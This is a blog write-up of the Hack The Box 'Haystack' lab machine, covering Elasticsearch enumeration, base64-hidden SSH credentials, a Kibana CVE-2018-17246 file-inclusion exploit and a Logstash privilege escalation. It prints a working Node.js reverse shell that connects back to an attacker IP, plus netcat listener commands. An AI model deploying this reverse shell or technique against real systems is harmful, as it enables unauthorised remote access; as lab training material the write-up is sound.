---
layout: single
title: Haystack Writeup
date:  '2019-11-19 14:43:00'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2019/2019-11-19-haystack-writeup/haystack.png
    text: "https://app.hackthebox.eu/machines/195"
typora-copy-images-to: ../../images/posts/2019/${filename}/
---
This wasn't my favourite box, and was my first CTF style one, and so I  found it a little frustrating in places and missed a big clue that meant a load of slogging. Once past the user part I found the box a lot more  fun.…

## Enumeration

Starting with Autorecon we can see that ports 80, 22 and 9200 are open. Looking at port 80 we can see it just displays a picture

![vlcsnap-2019-07-22-19h49m58s866](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-19h49m58s866.png)

I thought this was just nice illustration, needle in a haystack etc, though this was me not being used to CTF style clues. If you download the file and use `strings` on it you'll find a base64 encoded clue for searching. However, I did this the hard way!

Moving onto some Nmap output it showed 9200 was running Elasticsearch

`9200/tcp open  elasticsearch syn-ack ttl 63 Elastic elasticsearch 6.4.2`

## Initial Exploitation

Good stuff, so next we have a look at what indexes are available

![vlcsnap-2019-07-22-19h59m47s931](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-19h59m47s931.png)

So, two instances and it looks like Kibana is installed somewhere. I tried elasticdump at this point but couldn't get it to work. I then ran a query to return all the results in the quotes index and saved them to a file.

![vlcsnap-2019-07-22-20h04m59s464](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-20h04m59s464.png)

I then grepped for various words translated to Spanish such as needle, haystack etc. which was on the correct path but the wrong word. In the end I just scanned through the entries manually until I noticed a base64 encoded one

![vlcsnap-2019-07-22-20h08m58s936](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-20h08m58s936.png)

Decoding this we get
```bash
root@RD1734747W10:~/hackthebox/haystack# echo cGFzczogc3BhbmlzaC5pcy5rZXk= |base64 -d
pass: spanish.is.key
```
Okay, now we need to find the username. I try a couple of different greps based on the word in the sentence with the password, before trying _clave_ which is Spanish for key. Obvious really!

![vlcsnap-2019-07-22-20h13m30s471](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-20h13m30s471.png)

The second bit of base64 decodes as
```bash
root@RD1734747W10:~/hackthebox/haystack# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security
```
Good stuff, lets see if that works to ssh into the box

![vlcsnap-2019-07-22-20h17m22s277](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-22-20h17m22s277.png)

Yup, and we can grab the user flag. On to root.

## Escalating Privileges

### Enumeration: Part 2

At this point we need to start enumerating again to see what we can see from our new position. Doing a `ps` it looked like Kibana was running, was wasn't unexpected given the presence of Elasticsearch. Running `ss state listening` showed Kibana listening on 5601.

### Compromising another account

Knowing from the nmap that the Kibana version was likely the same as the Elasticsearch, 6.4.2, I searched for any exploits and found [https://github.com/mpgn/CVE-2018-17246/](https://github.com/mpgn/CVE-2018-17246/) which look promising.

I saved the shell:
```python
(function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4096, "10.10.14.12", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return /a/; // Prevents the Node.js application form crashing
})();
```
on my Kali box and the used `scp` to copy it to `\tmp` on the server. I started a listener on Kali with `nc -lvp 4096` and then when logged in as `security` on the server I ran

![vlcsnap-2019-07-23-16h55m08s672](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-23-16h55m08s672.png)

and caught the shell in the other window. I did have an issue that took a bit of searching to fix. If the connection dies for any reason re-running the command fails. If you rename `shell.js` to `shell2.js` (or anything else really) it will work again.

### Enumeration: Part 3

Now we are the Kibana user, it's time to enumerate again to see what we have access to now. I used [LinEnum](https://github.com/rebootuser/LinEnum) for this.

LinEnum turned up some interesting files in `/etc/logstash/conf.d/` which meant that any files created with the name starting with `/opt/kibana/logstash_*` and the correct line would be executed by the logstash process which runs as root!

![vlcsnap-2019-07-23-17h15m41s319](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-23-17h15m41s319.png)

### Escalation to root

So to exploit this we create a file, `/opt/kibana/logstash_shell` and start a listener `nc -lvp 8080` We then put the following in the file and wait...

![vlcsnap-2019-07-23-17h18m59s311](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-23-17h18m59s311.png)

We get a connection back to the listener and the root flag, job done.![vlcsnap-2019-07-23-17h20m21s470](../../images/posts/2019/2019-11-19-haystack-writeup/vlcsnap-2019-07-23-17h20m21s470.png)